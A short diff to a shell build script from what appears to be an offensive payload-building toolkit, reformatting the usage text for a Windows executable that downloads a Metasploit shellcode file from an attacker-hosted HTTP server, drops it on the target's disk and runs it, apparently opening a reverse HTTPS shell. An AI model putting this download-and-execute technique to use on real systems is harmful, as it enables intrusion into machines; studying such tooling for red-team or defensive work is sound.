@@ -57,17 +57,12 @@ strip output/downloadcertutil_revhttps_win32.exe
 # cleanup
 cleanup_techniques
 
-echo "The generated msf payload needs to be hosted on a HTTP server
-Call your payload like:
-downloadcertutil_revhttps_win32.exe http://myserver/thepayload.bin
-The executable will download and drop the payload as a file 'thepayload.bin' on the target's disk.
-It will then execute the shellcode given in the file."
 
-
-#USAGE_START
+echo "
 # The generated msf payload needs to be hosted on a HTTP server
 # Call your payload like:
-# downloadcertutil_revhttps_win32.exe http://myserver/thepayload.bin
+# $ downloadcertutil_revhttps_win32.exe http://myserver/thepayload.bin
+
 # The executable will download and drop the payload as a file on the target's disk.
 # It will then execute the shellcode given in the file.
-#USAGE_END
+"
